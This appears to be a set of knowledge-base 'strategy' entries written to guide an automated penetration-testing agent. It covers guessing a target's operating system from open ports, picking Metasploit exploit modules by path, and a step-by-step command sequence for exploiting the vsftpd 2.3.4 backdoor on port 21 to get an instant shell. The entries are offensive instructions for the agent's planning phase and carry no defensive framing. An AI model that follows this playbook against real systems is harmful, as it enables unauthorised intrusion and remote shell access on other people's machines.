NAME: manual/tactic/os_fingerprinting_by_port
TYPE: strategy
KEYWORDS: recon os detection windows linux unix port mapping
DESCRIPTION: How to guess the Operating System based on open ports.
INSTRUCTIONS:
IF Port 445 (SMB) is OPEN -> Target is likely WINDOWS.
        IF Port 139 (NetBIOS) is OPEN -> Target is likely WINDOWS.
        IF Port 3389 (RDP) is OPEN -> Target is likely WINDOWS.
        IF Port 22 (SSH) is OPEN -> Target is likely LINUX or UNIX.
        IF Port 111 (RPC) is OPEN -> Target is likely LINUX or UNIX.
        IF Port 2049 (NFS) is OPEN -> Target is likely LINUX or UNIX.
        
        DECISION LOGIC:
        - If targeting Windows ports, prioritize 'exploit/windows/...' modules.
        - If targeting Linux ports, prioritize 'exploit/linux/...' or 'exploit/unix/...' modules.
USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.

TYPE: strategy
KEYWORDS: ftp port 21 vsftpd backdoor exploit guide
DESCRIPTION: Tactical guide for attacking vsftpd 2.3.4 on Port 21.
INSTRUCTIONS:
TRIGGER: If Port 21 is OPEN and service banner contains "vsftpd 2.3.4".
        RECOMMENDED MODULE: exploit/unix/ftp/vsftpd_234_backdoor
        
        CONFIGURATION STEPS:
        1. use exploit/unix/ftp/vsftpd_234_backdoor
        2. set RHOSTS <TARGET_IP>
        3. set RPORT 21
        4. set UNKNOWN_CONNECTION_ERROR true (optional, helps connectivity)
        5. exploit
        
        NOTE: This module opens a shell instantly. No complex payload needed.

NAME: manual/tactic/general_module_selection_logic
TYPE: strategy
KEYWORDS: how to choose module matching logic
DESCRIPTION: Rules for matching modules to targets.
INSTRUCTIONS:
1. OS MATCH: Never run a 'windows' exploit against a target with Port 22 (SSH) unless you are sure.
        2. SERVICE MATCH: Check the port. Port 21 is FTP. Port 22 is SSH. Port 23 is Telnet. Port 80 is HTTP. Port 445 is SMB.
        3. MODULE PATH: The path tells you the OS. 
           - exploit/WINDOWS/... -> Only for Windows.
           - exploit/LINUX/... -> Only for Linux.
           - exploit/UNIX/... -> Generic Unix/Linux.
           - exploit/MULTI/... -> Works on multiple OS (check options).
USAGE_NOTE: Apply this logic during the PLANNING phase to select the correct module based on OS and Port.
